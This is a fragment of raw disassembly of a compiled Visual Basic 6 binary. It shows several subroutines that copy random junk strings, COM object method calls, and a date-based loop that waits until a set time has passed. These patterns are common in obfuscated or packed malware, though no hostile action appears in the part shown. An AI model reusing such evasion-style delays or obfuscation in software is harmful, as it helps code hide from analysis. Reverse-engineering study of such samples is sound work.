.text:0040CD04                 lea     eax, [ebp+var_44]
.text:0040CD07                 push    eax
.text:0040CD08                 call    __vbaAryLock
.text:0040CD0D                 push    1
.text:0040CD0F                 push    1
.text:0040CD11                 mov     eax, [ebp+var_44]
.text:0040CD14                 xor     ecx, ecx
.text:0040CD16                 sub     ecx, [eax+14h]
.text:0040CD19                 mov     eax, [ebp+var_44]
.text:0040CD1C                 mov     eax, [eax+0Ch]
.text:0040CD1F                 add     eax, ecx
.text:0040CD21                 push    eax
.text:0040CD22                 call    sub_40A4A1
.text:0040CD27                 mov     [ebp+var_70], eax
.text:0040CD2A                 lea     eax, [ebp+var_44]
.text:0040CD2D                 push    eax
.text:0040CD2E                 call    __vbaAryUnlock
.text:0040CD33                 cmp     dword_40E0AC, 0
.text:0040CD3A                 jnz     short loc_40CD57
.text:0040CD3C                 push    offset dword_40E0AC
.text:0040CD41                 push    offset dword_401960
.text:0040CD46                 call    __vbaNew2
.text:0040CD4B                 mov     [ebp+var_F4], offset dword_40E0AC
.text:0040CD55                 jmp     short loc_40CD61
.text:0040CD57 ; ---------------------------------------------------------------------------
.text:0040CD57
.text:0040CD57 loc_40CD57:                             ; CODE XREF: sub_40C38F+9AB↑j
.text:0040CD57                 mov     [ebp+var_F4], offset dword_40E0AC
.text:0040CD61
.text:0040CD61 loc_40CD61:                             ; CODE XREF: sub_40C38F+9C6↑j
.text:0040CD61                 mov     eax, [ebp+var_F4]
.text:0040CD67                 mov     eax, [eax]
.text:0040CD69                 mov     [ebp+var_B0], eax
.text:0040CD6F                 mov     eax, [ebp+var_3C]
.text:0040CD72                 mov     [ebp+var_5C], eax
.text:0040CD75                 mov     [ebp+var_64], 2011h
.text:0040CD7C                 lea     eax, [ebp+var_74]
.text:0040CD7F                 push    eax
.text:0040CD80                 push    10h
.text:0040CD82                 pop     eax
.text:0040CD83                 call    __vbaChkstk
.text:0040CD88                 lea     esi, [ebp+var_64]
.text:0040CD8B                 mov     edi, esp
.text:0040CD8D                 movsd
.text:0040CD8E                 movsd
.text:0040CD8F                 movsd
.text:0040CD90                 movsd
.text:0040CD91                 mov     eax, [ebp+var_B0]
.text:0040CD97                 mov     eax, [eax]
.text:0040CD99                 push    [ebp+var_B0]
.text:0040CD9F                 call    dword ptr [eax+38h]
.text:0040CDA2                 fnclex
.text:0040CDA4                 mov     [ebp+var_B4], eax
.text:0040CDAA                 cmp     [ebp+var_B4], 0
.text:0040CDB1                 jge     short loc_40CDD3
.text:0040CDB3                 push    38h ; '8'
.text:0040CDB5                 push    offset dword_4027CC
.text:0040CDBA                 push    [ebp+var_B0]
.text:0040CDC0                 push    [ebp+var_B4]
.text:0040CDC6                 call    __vbaHresultCheckObj
.text:0040CDCB                 mov     [ebp+var_F8], eax
.text:0040CDD1                 jmp     short loc_40CDDA
.text:0040CDD3 ; ---------------------------------------------------------------------------
.text:0040CDD3
.text:0040CDD3 loc_40CDD3:                             ; CODE XREF: sub_40C38F+A22↑j
.text:0040CDD3                 and     [ebp+var_F8], 0
.text:0040CDDA
.text:0040CDDA loc_40CDDA:                             ; CODE XREF: sub_40C38F+A42↑j
.text:0040CDDA                 push    1
.text:0040CDDC                 push    1
.text:0040CDDE                 lea     eax, [ebp+var_28]
.text:0040CDE1                 push    eax
.text:0040CDE2                 call    sub_40D0DD
.text:0040CDE7                 mov     [ebp+var_A4], eax
.text:0040CDED                 cmp     dword_40E0AC, 0
.text:0040CDF4                 jnz     short loc_40CE11
.text:0040CDF6                 push    offset dword_40E0AC
.text:0040CDFB                 push    offset dword_401960
.text:0040CE00                 call    __vbaNew2
.text:0040CE05                 mov     [ebp+var_FC], offset dword_40E0AC
.text:0040CE0F                 jmp     short loc_40CE1B
.text:0040CE11 ; ---------------------------------------------------------------------------
.text:0040CE11
.text:0040CE11 loc_40CE11:                             ; CODE XREF: sub_40C38F+A65↑j
.text:0040CE11                 mov     [ebp+var_FC], offset dword_40E0AC
.text:0040CE1B
.text:0040CE1B loc_40CE1B:                             ; CODE XREF: sub_40C38F+A80↑j
.text:0040CE1B                 mov     eax, [ebp+var_FC]
.text:0040CE21                 mov     eax, [eax]
.text:0040CE23                 mov     [ebp+var_B8], eax
.text:0040CE29                 and     [ebp+var_9C], 0
.text:0040CE30                 and     [ebp+var_98], 0
.text:0040CE37                 and     [ebp+var_94], 0
.text:0040CE3E                 mov     eax, [ebp+var_A4]
.text:0040CE44                 mov     [ebp+var_90], eax
.text:0040CE4A                 mov     eax, [ebp+var_74]
.text:0040CE4D                 mov     [ebp+var_8C], eax
.text:0040CE53                 mov     eax, [ebp+var_70]
.text:0040CE56                 mov     [ebp+var_88], eax
.text:0040CE5C                 fild    [ebp+var_6C]
.text:0040CE5F                 fstp    [ebp+var_104]
.text:0040CE65                 fld     [ebp+var_104]
.text:0040CE6B                 fmul    ds:dbl_401328
.text:0040CE71                 call    __vbaFpI4
.text:0040CE76                 mov     [ebp+var_84], eax
.text:0040CE7C                 mov     eax, [ebp+var_68]
.text:0040CE7F                 mov     [ebp+var_80], eax
.text:0040CE82                 mov     [ebp+var_7C], 2
.text:0040CE89                 mov     [ebp+var_78], 6
.text:0040CE90                 lea     eax, [ebp+var_A0]
.text:0040CE96                 push    eax
.text:0040CE97                 lea     eax, [ebp+var_9C]
.text:0040CE9D                 push    eax
.text:0040CE9E                 lea     eax, [ebp+var_98]
.text:0040CEA4                 push    eax
.text:0040CEA5                 lea     eax, [ebp+var_94]
.text:0040CEAB                 push    eax
.text:0040CEAC                 lea     eax, [ebp+var_90]
.text:0040CEB2                 push    eax
.text:0040CEB3                 lea     eax, [ebp+var_8C]
.text:0040CEB9                 push    eax
.text:0040CEBA                 lea     eax, [ebp+var_88]
.text:0040CEC0                 push    eax
.text:0040CEC1                 lea     eax, [ebp+var_84]
.text:0040CEC7                 push    eax
.text:0040CEC8                 lea     eax, [ebp+var_80]
.text:0040CECB                 push    eax
.text:0040CECC                 lea     eax, [ebp+var_7C]
.text:0040CECF                 push    eax
.text:0040CED0                 lea     eax, [ebp+var_78]
.text:0040CED3                 push    eax
.text:0040CED4                 push    dword_40E114
.text:0040CEDA                 push    dword_40E144
.text:0040CEE0                 mov     eax, [ebp+var_B8]
.text:0040CEE6                 mov     eax, [eax]
.text:0040CEE8                 push    [ebp+var_B8]
.text:0040CEEE                 call    dword ptr [eax+30h]
.text:0040CEF1                 fnclex
.text:0040CEF3                 mov     [ebp+var_BC], eax
.text:0040CEF9                 cmp     [ebp+var_BC], 0
.text:0040CF00                 jge     short loc_40CF22
.text:0040CF02                 push    30h ; '0'
.text:0040CF04                 push    offset dword_4027CC
.text:0040CF09                 push    [ebp+var_B8]
.text:0040CF0F                 push    [ebp+var_BC]
.text:0040CF15                 call    __vbaHresultCheckObj
.text:0040CF1A                 mov     [ebp+var_108], eax
.text:0040CF20                 jmp     short loc_40CF29
.text:0040CF22 ; ---------------------------------------------------------------------------
.text:0040CF22
.text:0040CF22 loc_40CF22:                             ; CODE XREF: sub_40C38F+B71↑j
.text:0040CF22                 and     [ebp+var_108], 0
.text:0040CF29
.text:0040CF29 loc_40CF29:                             ; CODE XREF: sub_40C38F+B91↑j
.text:0040CF29                 push    0
.text:0040CF2B                 mov     eax, [ebp+var_28]
.text:0040CF2E                 sub     eax, 1
.text:0040CF31                 jo      loc_40D0D8
.text:0040CF37                 push    eax
.text:0040CF38                 push    1
.text:0040CF3A                 push    11h
.text:0040CF3C                 push    [ebp+arg_0]
.text:0040CF3F                 push    1
.text:0040CF41                 push    80h
.text:0040CF46                 call    __vbaRedimPreserve
.text:0040CF4B                 add     esp, 1Ch
.text:0040CF4E                 cmp     dword_40E0AC, 0
.text:0040CF55                 jnz     short loc_40CF72
.text:0040CF57                 push    offset dword_40E0AC
.text:0040CF5C                 push    offset dword_401960
.text:0040CF61                 call    __vbaNew2
.text:0040CF66                 mov     [ebp+var_10C], offset dword_40E0AC
.text:0040CF70                 jmp     short loc_40CF7C
.text:0040CF72 ; ---------------------------------------------------------------------------
.text:0040CF72
.text:0040CF72 loc_40CF72:                             ; CODE XREF: sub_40C38F+BC6↑j
.text:0040CF72                 mov     [ebp+var_10C], offset dword_40E0AC
.text:0040CF7C
.text:0040CF7C loc_40CF7C:                             ; CODE XREF: sub_40C38F+BE1↑j
.text:0040CF7C                 mov     eax, [ebp+var_10C]
.text:0040CF82                 mov     eax, [eax]
.text:0040CF84                 mov     [ebp+var_A8], eax
.text:0040CF8A                 push    0
.text:0040CF8C                 push    0
.text:0040CF8E                 lea     eax, [ebp+var_2C]
.text:0040CF91                 push    eax
.text:0040CF92                 push    [ebp+arg_0]
.text:0040CF95                 mov     eax, [ebp+var_A8]
.text:0040CF9B                 mov     eax, [eax]
.text:0040CF9D                 push    [ebp+var_A8]
.text:0040CFA3                 call    dword ptr [eax+2Ch]
.text:0040CFA6                 fnclex
.text:0040CFA8                 mov     [ebp+var_AC], eax
.text:0040CFAE                 cmp     [ebp+var_AC], 0
.text:0040CFB5                 jge     short loc_40CFD7
.text:0040CFB7                 push    2Ch ; ','
.text:0040CFB9                 push    offset dword_4027CC
.text:0040CFBE                 push    [ebp+var_A8]
.text:0040CFC4                 push    [ebp+var_AC]
.text:0040CFCA                 call    __vbaHresultCheckObj
.text:0040CFCF                 mov     [ebp+var_110], eax
.text:0040CFD5                 jmp     short loc_40CFDE
.text:0040CFD7 ; ---------------------------------------------------------------------------
.text:0040CFD7
.text:0040CFD7 loc_40CFD7:                             ; CODE XREF: sub_40C38F+C26↑j
.text:0040CFD7                 and     [ebp+var_110], 0
.text:0040CFDE
.text:0040CFDE loc_40CFDE:                             ; CODE XREF: sub_40C38F+C46↑j
.text:0040CFDE                 mov     eax, [ebp+arg_8]
.text:0040CFE1                 cmp     word ptr [eax], 0FFFFh
.text:0040CFE5                 jz      loc_40D076
.text:0040CFEB                 cmp     dword_40E0AC, 0
.text:0040CFF2                 jnz     short loc_40D00F
.text:0040CFF4                 push    offset dword_40E0AC
.text:0040CFF9                 push    offset dword_401960
.text:0040CFFE                 call    __vbaNew2
.text:0040D003                 mov     [ebp+var_114], offset dword_40E0AC
.text:0040D00D                 jmp     short loc_40D019
.text:0040D00F ; ---------------------------------------------------------------------------
.text:0040D00F
.text:0040D00F loc_40D00F:                             ; CODE XREF: sub_40C38F+C63↑j
.text:0040D00F                 mov     [ebp+var_114], offset dword_40E0AC
.text:0040D019
.text:0040D019 loc_40D019:                             ; CODE XREF: sub_40C38F+C7E↑j
.text:0040D019                 mov     eax, [ebp+var_114]
.text:0040D01F                 mov     eax, [eax]
.text:0040D021                 mov     [ebp+var_A8], eax
.text:0040D027                 push    [ebp+var_20]
.text:0040D02A                 push    [ebp+arg_0]
.text:0040D02D                 mov     eax, [ebp+var_A8]
.text:0040D033                 mov     eax, [eax]
.text:0040D035                 push    [ebp+var_A8]
.text:0040D03B                 call    dword ptr [eax+40h]
.text:0040D03E                 fnclex
.text:0040D040                 mov     [ebp+var_AC], eax
.text:0040D046                 cmp     [ebp+var_AC], 0
.text:0040D04D                 jge     short loc_40D06F
.text:0040D04F                 push    40h ; '@'
.text:0040D051                 push    offset dword_4027CC
.text:0040D056                 push    [ebp+var_A8]
.text:0040D05C                 push    [ebp+var_AC]
.text:0040D062                 call    __vbaHresultCheckObj
.text:0040D067                 mov     [ebp+var_118], eax
.text:0040D06D                 jmp     short loc_40D076
.text:0040D06F ; ---------------------------------------------------------------------------
.text:0040D06F
.text:0040D06F loc_40D06F:                             ; CODE XREF: sub_40C38F+CBE↑j
.text:0040D06F                 and     [ebp+var_118], 0
.text:0040D076
.text:0040D076 loc_40D076:                             ; CODE XREF: sub_40C38F+C56↑j
.text:0040D076                                         ; sub_40C38F+CDE↑j
.text:0040D076                 wait
.text:0040D077                 push    offset loc_40D0C3
.text:0040D07C                 jmp     short loc_40D091
.text:0040D07E ; ---------------------------------------------------------------------------
.text:0040D07E
.text:0040D07E loc_40D07E:                             ; DATA XREF: .text:0040133C↑o
.text:0040D07E                 lea     eax, [ebp+var_40]
.text:0040D081                 push    eax
.text:0040D082                 call    __vbaAryUnlock
.text:0040D087                 lea     eax, [ebp+var_44]
.text:0040D08A                 push    eax
.text:0040D08B                 call    __vbaAryUnlock
.text:0040D090                 retn
.text:0040D091 ; ---------------------------------------------------------------------------
.text:0040D091
.text:0040D091 loc_40D091:                             ; CODE XREF: sub_40C38F+CED↑j
.text:0040D091                                         ; DATA XREF: .text:00401338↑o
.text:0040D091                 lea     ecx, [ebp+var_20]
.text:0040D094                 call    __vbaFreeStr
.text:0040D099                 lea     eax, [ebp+var_2C]
.text:0040D09C                 push    eax
.text:0040D09D                 push    0
.text:0040D09F                 call    __vbaAryDestruct
.text:0040D0A4                 lea     ecx, [ebp+var_34]
.text:0040D0A7                 call    __vbaFreeStr
.text:0040D0AC                 lea     eax, [ebp+var_38]
.text:0040D0AF                 push    eax
.text:0040D0B0                 push    0
.text:0040D0B2                 call    __vbaAryDestruct
.text:0040D0B7                 lea     eax, [ebp+var_3C]
.text:0040D0BA                 push    eax
.text:0040D0BB                 push    0
.text:0040D0BD                 call    __vbaAryDestruct
.text:0040D0C2                 retn
.text:0040D0C3 ; ---------------------------------------------------------------------------
.text:0040D0C3
.text:0040D0C3 loc_40D0C3:                             ; DATA XREF: sub_40C38F+CE8↑o
.text:0040D0C3                 mov     ax, [ebp+var_14]
.text:0040D0C7                 mov     ecx, [ebp+var_10]
.text:0040D0CA                 mov     large fs:0, ecx
.text:0040D0D1                 pop     edi
.text:0040D0D2                 pop     esi
.text:0040D0D3                 pop     ebx
.text:0040D0D4                 leave
.text:0040D0D5                 retn    0Ch
.text:0040D0D8 ; ---------------------------------------------------------------------------
.text:0040D0D8
.text:0040D0D8 loc_40D0D8:                             ; CODE XREF: sub_40C38F+4CF↑j
.text:0040D0D8                                         ; sub_40C38F+620↑j ...
.text:0040D0D8                 call    __vbaErrorOverflow
.text:0040D0D8 sub_40C38F      endp ; sp-analysis failed
.text:0040D0D8
.text:0040D0DD
.text:0040D0DD ; =============== S U B R O U T I N E =======================================
.text:0040D0DD
.text:0040D0DD ; Attributes: bp-based frame
.text:0040D0DD
.text:0040D0DD sub_40D0DD      proc near               ; CODE XREF: .text:00408770↑p
.text:0040D0DD                                         ; sub_40C38F+514↑p ...
.text:0040D0DD
.text:0040D0DD var_18          = dword ptr -18h
.text:0040D0DD var_14          = byte ptr -14h
.text:0040D0DD var_10          = dword ptr -10h
.text:0040D0DD var_8           = dword ptr -8
.text:0040D0DD var_4           = dword ptr -4
.text:0040D0DD
.text:0040D0DD                 push    ebp
.text:0040D0DE                 mov     ebp, esp
.text:0040D0E0                 push    ecx
.text:0040D0E1                 push    ecx
.text:0040D0E2                 push    offset __vbaExceptHandler
.text:0040D0E7                 mov     eax, large fs:0
.text:0040D0ED                 push    eax
.text:0040D0EE                 mov     large fs:0, esp
.text:0040D0F5                 push    0Ch
.text:0040D0F7                 pop     eax
.text:0040D0F8                 call    __vbaChkstk
.text:0040D0FD                 push    ebx
.text:0040D0FE                 push    esi
.text:0040D0FF                 push    edi
.text:0040D100                 mov     [ebp+var_8], esp
.text:0040D103                 mov     [ebp+var_4], offset dword_401340
.text:0040D10A                 mov     edx, offset aSkyrlvqqhheyb ; "skyrlvqqhheyb"
.text:0040D10F                 lea     ecx, [ebp+var_14]
.text:0040D112                 call    __vbaStrCopy
.text:0040D117                 push    offset loc_40D125
.text:0040D11C
.text:0040D11C loc_40D11C:                             ; DATA XREF: .text:00401348↑o
.text:0040D11C                 lea     ecx, [ebp+var_14]
.text:0040D11F                 call    __vbaFreeStr
.text:0040D124                 retn
.text:0040D125 ; ---------------------------------------------------------------------------
.text:0040D125
.text:0040D125 loc_40D125:                             ; DATA XREF: sub_40D0DD+3A↑o
.text:0040D125                 mov     eax, [ebp+var_18]
.text:0040D128                 mov     ecx, [ebp+var_10]
.text:0040D12B                 mov     large fs:0, ecx
.text:0040D132                 pop     edi
.text:0040D133                 pop     esi
.text:0040D134                 pop     ebx
.text:0040D135                 leave
.text:0040D136                 retn    0Ch
.text:0040D136 sub_40D0DD      endp ; sp-analysis failed
.text:0040D136
.text:0040D139
.text:0040D139 ; =============== S U B R O U T I N E =======================================
.text:0040D139
.text:0040D139 ; Attributes: bp-based frame
.text:0040D139
.text:0040D139 sub_40D139      proc near               ; CODE XREF: .text:00407A41↑p
.text:0040D139                                         ; .text:00407A64↑p ...
.text:0040D139
.text:0040D139 var_1C          = byte ptr -1Ch
.text:0040D139 var_18          = byte ptr -18h
.text:0040D139 var_14          = dword ptr -14h
.text:0040D139 var_10          = dword ptr -10h
.text:0040D139 var_8           = dword ptr -8
.text:0040D139 var_4           = dword ptr -4
.text:0040D139 arg_0           = dword ptr  8
.text:0040D139
.text:0040D139                 push    ebp
.text:0040D13A                 mov     ebp, esp
.text:0040D13C                 push    ecx
.text:0040D13D                 push    ecx
.text:0040D13E                 push    offset __vbaExceptHandler
.text:0040D143                 mov     eax, large fs:0
.text:0040D149                 push    eax
.text:0040D14A                 mov     large fs:0, esp
.text:0040D151                 push    10h
.text:0040D153                 pop     eax
.text:0040D154                 call    __vbaChkstk
.text:0040D159                 push    ebx
.text:0040D15A                 push    esi
.text:0040D15B                 push    edi
.text:0040D15C                 mov     [ebp+var_8], esp
.text:0040D15F                 mov     [ebp+var_4], offset dword_401350
.text:0040D166                 mov     edx, [ebp+arg_0]
.text:0040D169                 lea     ecx, [ebp+var_1C]
.text:0040D16C                 call    __vbaStrCopy
.text:0040D171                 mov     edx, offset aVcwhvawdsjhqnz ; "vcwhvawdsjhqnzpsa"
.text:0040D176                 lea     ecx, [ebp+var_18]
.text:0040D179                 call    __vbaStrCopy
.text:0040D17E                 push    offset loc_40D194
.text:0040D183
.text:0040D183 loc_40D183:                             ; DATA XREF: .text:00401358↑o
.text:0040D183                 lea     ecx, [ebp+var_18]
.text:0040D186                 call    __vbaFreeStr
.text:0040D18B                 lea     ecx, [ebp+var_1C]
.text:0040D18E                 call    __vbaFreeStr
.text:0040D193                 retn
.text:0040D194 ; ---------------------------------------------------------------------------
.text:0040D194
.text:0040D194 loc_40D194:                             ; DATA XREF: sub_40D139+45↑o
.text:0040D194                 mov     eax, [ebp+var_14]
.text:0040D197                 mov     ecx, [ebp+var_10]
.text:0040D19A                 mov     large fs:0, ecx
.text:0040D1A1                 pop     edi
.text:0040D1A2                 pop     esi
.text:0040D1A3                 pop     ebx
.text:0040D1A4                 leave
.text:0040D1A5                 retn    4
.text:0040D1A5 sub_40D139      endp ; sp-analysis failed
.text:0040D1A5
.text:0040D1A8
.text:0040D1A8 ; =============== S U B R O U T I N E =======================================
.text:0040D1A8
.text:0040D1A8 ; Attributes: bp-based frame
.text:0040D1A8
.text:0040D1A8 sub_40D1A8      proc near               ; CODE XREF: .text:00407BC8↑p
.text:0040D1A8                                         ; .text:00407CEB↑p
.text:0040D1A8                                         ; DATA XREF: ...
.text:0040D1A8
.text:0040D1A8 var_18          = byte ptr -18h
.text:0040D1A8 var_14          = dword ptr -14h
.text:0040D1A8 var_10          = dword ptr -10h
.text:0040D1A8 var_8           = dword ptr -8
.text:0040D1A8 var_4           = dword ptr -4
.text:0040D1A8
.text:0040D1A8                 push    ebp
.text:0040D1A9                 mov     ebp, esp
.text:0040D1AB                 push    ecx
.text:0040D1AC                 push    ecx
.text:0040D1AD                 push    offset __vbaExceptHandler
.text:0040D1B2                 mov     eax, large fs:0
.text:0040D1B8                 push    eax
.text:0040D1B9                 mov     large fs:0, esp
.text:0040D1C0                 push    0Ch
.text:0040D1C2                 pop     eax
.text:0040D1C3                 call    __vbaChkstk
.text:0040D1C8                 push    ebx
.text:0040D1C9                 push    esi
.text:0040D1CA                 push    edi
.text:0040D1CB                 mov     [ebp+var_8], esp
.text:0040D1CE                 mov     [ebp+var_4], offset dword_401360
.text:0040D1D5                 mov     edx, offset aVkzovxhrwxkhpt ; "vkzovxhrwxkhpt"
.text:0040D1DA                 lea     ecx, [ebp+var_18]
.text:0040D1DD                 call    __vbaStrCopy
.text:0040D1E2                 push    offset loc_40D1F0
.text:0040D1E7
.text:0040D1E7 loc_40D1E7:                             ; DATA XREF: .text:00401368↑o
.text:0040D1E7                 lea     ecx, [ebp+var_18]
.text:0040D1EA                 call    __vbaFreeStr
.text:0040D1EF                 retn
.text:0040D1F0 ; ---------------------------------------------------------------------------
.text:0040D1F0
.text:0040D1F0 loc_40D1F0:                             ; DATA XREF: sub_40D1A8+3A↑o
.text:0040D1F0                 mov     eax, [ebp+var_14]
.text:0040D1F3                 mov     ecx, [ebp+var_10]
.text:0040D1F6                 mov     large fs:0, ecx
.text:0040D1FD                 pop     edi
.text:0040D1FE                 pop     esi
.text:0040D1FF                 pop     ebx
.text:0040D200                 leave
.text:0040D201                 retn    10h
.text:0040D201 sub_40D1A8      endp ; sp-analysis failed
.text:0040D201
.text:0040D204
.text:0040D204 ; =============== S U B R O U T I N E =======================================
.text:0040D204
.text:0040D204 ; Attributes: bp-based frame
.text:0040D204
.text:0040D204 sub_40D204      proc near               ; CODE XREF: sub_40BD75+11A↑p
.text:0040D204                                         ; sub_40BD75+172↑p
.text:0040D204                                         ; DATA XREF: ...
.text:0040D204
.text:0040D204 var_18          = dword ptr -18h
.text:0040D204 var_14          = byte ptr -14h
.text:0040D204 var_10          = dword ptr -10h
.text:0040D204 var_8           = dword ptr -8
.text:0040D204 var_4           = dword ptr -4
.text:0040D204
.text:0040D204                 push    ebp
.text:0040D205                 mov     ebp, esp
.text:0040D207                 push    ecx
.text:0040D208                 push    ecx
.text:0040D209                 push    offset __vbaExceptHandler
.text:0040D20E                 mov     eax, large fs:0
.text:0040D214                 push    eax
.text:0040D215                 mov     large fs:0, esp
.text:0040D21C                 push    0Ch
.text:0040D21E                 pop     eax
.text:0040D21F                 call    __vbaChkstk
.text:0040D224                 push    ebx
.text:0040D225                 push    esi
.text:0040D226                 push    edi
.text:0040D227                 mov     [ebp+var_8], esp
.text:0040D22A                 mov     [ebp+var_4], offset dword_401370
.text:0040D231                 mov     edx, offset aOummfxfn ; "oummfxfn"
.text:0040D236                 lea     ecx, [ebp+var_14]
.text:0040D239                 call    __vbaStrCopy
.text:0040D23E                 push    offset loc_40D257
.text:0040D243                 jmp     short loc_40D24E
.text:0040D245 ; ---------------------------------------------------------------------------
.text:0040D245
.text:0040D245 loc_40D245:                             ; DATA XREF: .text:0040137C↑o
.text:0040D245                 lea     ecx, [ebp+var_18]
.text:0040D248                 call    __vbaFreeStr
.text:0040D24D                 retn
.text:0040D24E ; ---------------------------------------------------------------------------
.text:0040D24E
.text:0040D24E loc_40D24E:                             ; CODE XREF: sub_40D204+3F↑j
.text:0040D24E                                         ; DATA XREF: .text:00401378↑o
.text:0040D24E                 lea     ecx, [ebp+var_14]
.text:0040D251                 call    __vbaFreeStr
.text:0040D256                 retn
.text:0040D257 ; ---------------------------------------------------------------------------
.text:0040D257
.text:0040D257 loc_40D257:                             ; DATA XREF: sub_40D204+3A↑o
.text:0040D257                 mov     eax, [ebp+var_18]
.text:0040D25A                 mov     ecx, [ebp+var_10]
.text:0040D25D                 mov     large fs:0, ecx
.text:0040D264                 pop     edi
.text:0040D265                 pop     esi
.text:0040D266                 pop     ebx
.text:0040D267                 leave
.text:0040D268                 retn    4
.text:0040D268 sub_40D204      endp ; sp-analysis failed
.text:0040D268
.text:0040D26B
.text:0040D26B ; =============== S U B R O U T I N E =======================================
.text:0040D26B
.text:0040D26B ; Attributes: bp-based frame
.text:0040D26B
.text:0040D26B sub_40D26B      proc near               ; CODE XREF: sub_40A464+12↑p
.text:0040D26B                                         ; DATA XREF: sub_40A806+67C↑o
.text:0040D26B
.text:0040D26B var_18          = byte ptr -18h
.text:0040D26B var_14          = dword ptr -14h
.text:0040D26B var_10          = dword ptr -10h
.text:0040D26B var_8           = dword ptr -8
.text:0040D26B var_4           = dword ptr -4
.text:0040D26B
.text:0040D26B                 push    ebp
.text:0040D26C                 mov     ebp, esp
.text:0040D26E                 push    ecx
.text:0040D26F                 push    ecx
.text:0040D270                 push    offset __vbaExceptHandler
.text:0040D275                 mov     eax, large fs:0
.text:0040D27B                 push    eax
.text:0040D27C                 mov     large fs:0, esp
.text:0040D283                 push    0Ch
.text:0040D285                 pop     eax
.text:0040D286                 call    __vbaChkstk
.text:0040D28B                 push    ebx
.text:0040D28C                 push    esi
.text:0040D28D                 push    edi
.text:0040D28E                 mov     [ebp+var_8], esp
.text:0040D291                 mov     [ebp+var_4], offset dword_401380
.text:0040D298                 mov     edx, offset aFwieingzzyrmrc ; "fwieingzzyrmrcvlw"
.text:0040D29D                 lea     ecx, [ebp+var_18]
.text:0040D2A0                 call    __vbaStrCopy
.text:0040D2A5                 push    offset loc_40D2B3
.text:0040D2AA
.text:0040D2AA loc_40D2AA:                             ; DATA XREF: .text:00401388↑o
.text:0040D2AA                 lea     ecx, [ebp+var_18]
.text:0040D2AD                 call    __vbaFreeStr
.text:0040D2B2                 retn
.text:0040D2B3 ; ---------------------------------------------------------------------------
.text:0040D2B3
.text:0040D2B3 loc_40D2B3:                             ; DATA XREF: sub_40D26B+3A↑o
.text:0040D2B3                 mov     eax, [ebp+var_14]
.text:0040D2B6                 mov     ecx, [ebp+var_10]
.text:0040D2B9                 mov     large fs:0, ecx
.text:0040D2C0                 pop     edi
.text:0040D2C1                 pop     esi
.text:0040D2C2                 pop     ebx
.text:0040D2C3                 leave
.text:0040D2C4                 retn    0Ch
.text:0040D2C4 sub_40D26B      endp ; sp-analysis failed
.text:0040D2C4
.text:0040D2C7
.text:0040D2C7 ; =============== S U B R O U T I N E =======================================
.text:0040D2C7
.text:0040D2C7 ; Attributes: bp-based frame
.text:0040D2C7
.text:0040D2C7 sub_40D2C7      proc near               ; CODE XREF: sub_40BF67+B↑p
.text:0040D2C7
.text:0040D2C7 var_80          = qword ptr -80h
.text:0040D2C7 var_64          = word ptr -64h
.text:0040D2C7 var_50          = byte ptr -50h
.text:0040D2C7 var_40          = dword ptr -40h
.text:0040D2C7 var_38          = dword ptr -38h
.text:0040D2C7 var_30          = byte ptr -30h
.text:0040D2C7 var_20          = byte ptr -20h
.text:0040D2C7 var_10          = dword ptr -10h
.text:0040D2C7 var_8           = dword ptr -8
.text:0040D2C7 var_4           = dword ptr -4
.text:0040D2C7
.text:0040D2C7                 push    ebp
.text:0040D2C8                 mov     ebp, esp
.text:0040D2CA                 push    ecx
.text:0040D2CB                 push    ecx
.text:0040D2CC                 push    offset __vbaExceptHandler
.text:0040D2D1                 mov     eax, large fs:0
.text:0040D2D7                 push    eax
.text:0040D2D8                 mov     large fs:0, esp
.text:0040D2DF                 push    58h ; 'X'
.text:0040D2E1                 pop     eax
.text:0040D2E2                 call    __vbaChkstk
.text:0040D2E7                 push    ebx
.text:0040D2E8                 push    esi
.text:0040D2E9                 push    edi
.text:0040D2EA                 mov     [ebp+var_8], esp
.text:0040D2ED                 mov     [ebp+var_4], offset dword_401398
.text:0040D2F4                 lea     eax, [ebp+var_30]
.text:0040D2F7                 push    eax
.text:0040D2F8                 call    rtcGetPresentDate
.text:0040D2FD                 lea     eax, [ebp+var_30]
.text:0040D300                 push    eax
.text:0040D301                 fld     ds:dbl_401390
.text:0040D307                 push    ecx
.text:0040D308                 push    ecx
.text:0040D309                 fstp    [esp+80h+var_80]
.text:0040D30C                 push    offset dword_4035E0
.text:0040D311                 lea     eax, [ebp+var_40]
.text:0040D314                 push    eax
.text:0040D315                 call    rtcDateAdd
.text:0040D31A                 lea     edx, [ebp+var_40]
.text:0040D31D                 lea     ecx, [ebp+var_20]
.text:0040D320                 call    __vbaVarMove
.text:0040D325                 lea     ecx, [ebp+var_30]
.text:0040D328                 call    __vbaFreeVar
.text:0040D32D
.text:0040D32D loc_40D32D:                             ; CODE XREF: sub_40D2C7+DE↓j
.text:0040D32D                 lea     eax, [ebp+var_30]
.text:0040D330                 push    eax
.text:0040D331                 call    rtcGetPresentDate
.text:0040D336                 lea     eax, [ebp+var_20]
.text:0040D339                 push    eax
.text:0040D33A                 lea     eax, [ebp+var_30]
.text:0040D33D                 push    eax
.text:0040D33E                 call    __vbaVarTstGt
.text:0040D343                 mov     [ebp+var_64], ax
.text:0040D347                 lea     ecx, [ebp+var_30]
.text:0040D34A                 call    __vbaFreeVar
.text:0040D34F                 movsx   eax, [ebp+var_64]
.text:0040D353                 test    eax, eax
.text:0040D355                 jz      short loc_40D3A7
.text:0040D357                 lea     eax, [ebp+var_30]
.text:0040D35A                 push    eax
.text:0040D35B                 call    rtcGetPresentDate
.text:0040D360                 mov     [ebp+var_38], 1
.text:0040D367                 mov     [ebp+var_40], 2
.text:0040D36E                 push    1
.text:0040D370                 push    1
.text:0040D372                 lea     eax, [ebp+var_30]
.text:0040D375                 push    eax
.text:0040D376                 lea     eax, [ebp+var_40]
.text:0040D379                 push    eax
.text:0040D37A                 push    offset dword_4037D0
.text:0040D37F                 lea     eax, [ebp+var_50]
.text:0040D382                 push    eax
.text:0040D383                 call    rtcDateDiff
.text:0040D388                 lea     edx, [ebp+var_50]
.text:0040D38B                 lea     ecx, [ebp+var_20]
.text:0040D38E                 call    __vbaVarMove
.text:0040D393                 lea     eax, [ebp+var_30]
.text:0040D396                 push    eax
.text:0040D397                 lea     eax, [ebp+var_40]
.text:0040D39A                 push    eax
.text:0040D39B                 push    2
.text:0040D39D                 call    __vbaFreeVarList
.text:0040D3A2                 add     esp, 0Ch
.text:0040D3A5                 jmp     short loc_40D32D
.text:0040D3A7 ; ---------------------------------------------------------------------------
.text:0040D3A7
.text:0040D3A7 loc_40D3A7:                             ; CODE XREF: sub_40D2C7+8E↑j
.text:0040D3A7                 wait
.text:0040D3A8                 push    offset loc_40D3CF
